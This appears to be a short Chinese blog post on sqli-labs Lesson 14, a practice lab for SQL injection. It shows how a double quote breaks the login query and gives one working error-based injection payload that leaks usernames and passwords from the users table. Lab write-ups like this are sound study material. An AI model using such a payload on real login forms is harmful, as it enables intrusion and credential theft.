---
title: sqli-labs-lession 14 POST双引号双注入变形
date: 2018-09-27 20:40:43
tags: [sqli-labs]
categories: sql注入
---
# sqli-labs-lession 14 POST双引号双注入变形 #
---

## 登录界面 ##

![1](/img/sql/Lesson-14/1.png)

## 注入过程 ##

和上一课其实原理一样,检查注入类型即可。

输入`'`号，被吃掉了。`')`也不行。来一个`"`

![2](/img/sql/Lesson-14/2.png)

把上一课的payload改个引号拿来用。

`xxx" union select count(*),concat((floor(rand(0)*2)),'--',(select concat(username,':',password) from security.users limit 0,1))a from information_schema.tables group by a#`

具体细节看Lesson-13

{% post_link sqli-labs-lession-13-POST单引号双注入变形 查看Lesson-13%}